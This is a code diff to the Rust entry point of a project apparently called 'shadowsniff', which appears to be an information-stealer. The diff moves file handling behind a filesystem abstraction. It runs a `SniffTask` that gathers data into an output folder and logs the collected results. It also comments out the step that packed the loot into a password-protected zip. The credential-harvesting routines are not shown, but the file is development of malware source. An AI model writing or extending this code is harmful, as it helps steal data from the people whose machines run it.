@@ -7,14 +7,15 @@
 extern crate alloc;
 
 use alloc::format;
-use collector::DisplayCollector;
 use collector::atomic::AtomicCollector;
+use collector::DisplayCollector;
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::{FileSystem, FileSystemExt};
 use ipinfo::init_ip_info;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
-use utils::path::Path;
-use zip::ZipArchive;
 
 mod panic;
 
@@ -28,28 +29,29 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
         panic!()
     }
 
-    let out = Path::new("output");
-    let _ = out.remove_dir_all();
-    let _ = out.mkdir();
+    let fs = StorageFileSystem;
+    let out = &Path::new("output");
+    let _ = fs.remove_dir_all(out);
+    let _ = fs.mkdir(out);
 
     let collector = AtomicCollector::default();
 
     unsafe {
-        SniffTask::default().run(&out, &collector);
+        SniffTask::default().run(out, &fs, &collector);
     }
 
     let displayed_collector = format!("{}", DisplayCollector(collector));
 
     log_debug!("{displayed_collector}");
 
-    let zip = ZipArchive::default()
-        .add_folder_content(&out)
-        .password("shadowsniff-output")
-        .comment(displayed_collector)
-        .create();
-
-    let out = Path::new("output.zip");
-    let _ = out.write_file(&zip);
+    // let zip = ZipArchive::default()
+    //     .add_folder_content(&fs, &out)
+    //     .password("shadowsniff-output")
+    //     .comment(displayed_collector)
+    //     .create();
+    //
+    // let out = Path::new("output.zip");
+    // let _ = StorageFileSystem.write_file(&out, &zip);
 
     0
 }
